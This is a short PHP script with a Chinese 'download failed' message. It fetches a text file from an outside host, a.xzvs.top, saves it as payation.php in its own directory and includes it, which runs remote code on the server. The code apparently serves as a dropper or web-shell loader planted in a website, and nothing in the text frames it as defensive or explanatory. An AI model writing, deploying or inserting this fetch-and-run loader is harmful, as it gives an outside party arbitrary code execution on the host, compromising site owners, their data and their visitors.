<?php

$url = "http://a.xzvs.top/payation.txt";

$savePath = __DIR__ . "/payation.php";

$content = file_get_contents($url);

if ($content === false) {
    die("下载失败");
}

file_put_contents($savePath, $content);

include $savePath;
